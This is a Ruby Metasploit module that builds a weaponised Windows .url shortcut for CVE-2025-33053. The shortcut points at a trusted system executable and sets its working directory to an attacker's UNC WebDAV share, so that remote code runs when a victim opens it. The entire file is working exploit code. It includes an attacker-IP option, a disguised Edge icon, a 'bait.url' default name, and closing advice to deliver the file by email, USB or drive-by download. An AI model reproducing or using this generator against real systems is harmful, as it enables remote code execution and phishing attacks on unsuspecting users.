##
# CVE-2025-33053 .URL Generator - Full Options
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'CVE-2025-33053 .URL File Generator',
      'Description' => %q{
        Generates a .url file that abuses CVE-2025-33053 to achieve RCE via a UNC path
        pointing to a malicious WebDAV share. This works by setting the WorkingDirectory
        to a remote UNC path while referencing a trusted LOLBAS executable.
      },
      'Author'      => [ 'Dev Bui Hieu'],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2025-33053'],
          ['URL', 'https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept']
        ],
      'DisclosureDate' => '2025-06-11'
    ))

    register_options(
      [
        OptString.new('IP', [true, 'Attacker IP address or domain for UNC path']),
        OptString.new('SHARE', [false, 'WebDAV share name (default: webdav)', 'webdav']),
        OptString.new('OUTFILE', [false, 'Output .url file name (default: bait.url)', 'bait.url']),
        OptString.new('EXE', [false, 'LOLBAS executable path on victim', 'C:\\Program Files\\Internet Explorer\\iediagcmd.exe']),
        OptString.new('ICON', [false, 'Icon file path', 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe']),
        OptInt.new('INDEX', [false, 'Icon index', 13]),
        OptString.new('MODIFIED', [false, 'Modified hex timestamp', '20F06BA06D07BD014D'])
      ]
    )
  end

  def run
    ip       = datastore['IP']
    share    = datastore['SHARE'] || 'webdav'
    outfile  = datastore['OUTFILE'] || 'bait.url'
    exe      = datastore['EXE'] || 'C:\\Program Files\\Internet Explorer\\iediagcmd.exe'
    icon     = datastore['ICON'] || 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'
    index    = datastore['INDEX'] || 13
    modified = datastore['MODIFIED'] || '20F06BA06D07BD014D'

    unc_path = "\\\\#{ip}\\#{share}\\"

    url_content = <<~EOF
      [InternetShortcut]
      URL=#{exe}
      WorkingDirectory=#{unc_path}
      ShowCommand=7
      IconIndex=#{index}
      IconFile=#{icon}
      Modified=#{modified}
    EOF

    out_path = ::File.join(Msf::Config.local_directory, outfile)
    File.write(out_path, url_content)

    print_good("✔ .url file created at: #{out_path}")
    print_status("UNC path: #{unc_path}")
    print_status("Deliver the file via email, USB, or drive-by download.")
  end
end